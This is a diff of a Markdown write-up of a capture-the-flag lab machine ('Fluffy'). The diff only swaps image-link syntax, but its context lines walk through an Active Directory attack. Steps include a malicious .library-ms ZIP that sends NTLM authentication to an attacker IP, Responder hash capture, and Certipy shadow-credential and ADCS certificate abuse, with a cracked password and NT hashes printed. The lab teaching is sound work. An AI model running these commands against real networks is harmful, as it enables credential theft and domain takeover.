@@ -85,11 +85,11 @@ Connect to the IT share and explore available files:
 smbclient //<target>/IT -U j.fleischman
 ```
 
-![[Pasted image 20260906063224.png]]
+![](/assets/img/fluffy/Pasted_image_20260906063224.png)
 
 Several files are discovered within the IT share. A PDF regarding system updates is found along with a KeePass folder. The KeePass folder does not contain a .kdbx file, but the update documentation becomes relevant for the exploitation phase.
 
-![[Pasted image 20260906063729.png]]
+![](/assets/img/fluffy/Pasted_image_20260906063729.png)
 
 ### BloodHound Data Collection
 
@@ -124,7 +124,7 @@ Create the malicious ZIP payload with a crafted .library-ms file:
 python3 exploit.py -f malicious -i 10.10.17.167
 ```
 
-![[Pasted image 20260906063915.png]]
+![](/assets/img/fluffy/Pasted_image_20260906063915.png)
 
 The exploit generates exploit.zip, containing a malicious .library-ms file configured to authenticate to the attacker's IP address.
 
@@ -138,7 +138,7 @@ smbclient //<target>/IT -U j.fleischman
 smb: \> put exploit.zip
 ```
 
-![[Pasted image 20260906063949.png]]
+![](/assets/img/fluffy/Pasted_image_20260906063949.png)
 
 #### Step 3: Capture NTLM Hash via Responder
 
@@ -148,7 +148,7 @@ Set up a responder listener to capture NTLM authentication attempts:
 sudo responder -I tun0 -v
 ```
 
-![[Pasted image 20260906064037.png]]
+![](/assets/img/fluffy/Pasted_image_20260906064037.png)
 
 When a domain user extracts or interacts with the exploit.zip file on their system, their NTLM credentials are captured by responder.
 
@@ -175,7 +175,7 @@ prometheusx-303  (p.agila)
 
 BloodHound analysis reveals that p.agila has GenericAll privileges over the Service Accounts group. The Service Accounts group has GenericWrite on the winrm_svc user account.
 
-![[Pasted image 20260906043327.png]]
+![](/assets/img/fluffy/Pasted_image_20260906043327.png)
 
 #### Step 1: Add p.agila to Service Accounts
 
@@ -198,7 +198,7 @@ certipy-ad shadow auto \
   -account winrm_svc
 ```
 
-![[Pasted image 20260906050250.png]]
+![](/assets/img/fluffy/Pasted_image_20260906050250.png)
 
 The attack successfully adds a shadow credential to winrm_svc, extracting its NT hash:
 
@@ -226,9 +226,9 @@ type C:\Users\winrm_svc\Desktop\user.txt
 
 BloodHound analysis reveals that the ca_svc account is a member of the Cert Publishers Group, which is associated with the Denied RODC Password Replication Group. This positioning suggests ca_svc has ADCS-related privileges.
 
-![[Pasted image 20260906065343.png]]
+![](/assets/img/fluffy/Pasted_image_20260906065343.png)
 
-![[Pasted image 20260906065349.png]]
+![](/assets/img/fluffy/Pasted_image_20260906065349.png)
 
 #### Step 1: Shadow Credentials on ca_svc
 
@@ -241,7 +241,7 @@ certipy-ad shadow auto \
   -account ca_svc
 ```
 
-![[Pasted image 20260906071152.png]]
+![](/assets/img/fluffy/Pasted_image_20260906071152.png)
 
 The attack extracts the ca_svc NT hash:
 
@@ -255,7 +255,7 @@ Use certipy-ad to identify vulnerable certificate templates:
 certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
 ```
 
-![[Pasted image 20260906065542.png]]
+![](/assets/img/fluffy/Pasted_image_20260906065542.png)
 
 **Findings:**
 
@@ -318,7 +318,7 @@ faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
 certipy-ad auth -dc-ip <target> -pfx administrator.pfx -u administrator -domain fluffy.htb
 ```
 
-![[Pasted image 20260906071433.png]]
+![](/assets/img/fluffy/Pasted_image_20260906071433.png)
 
 **Administrator NT Hash:** Extracted from certificate-based authentication
 
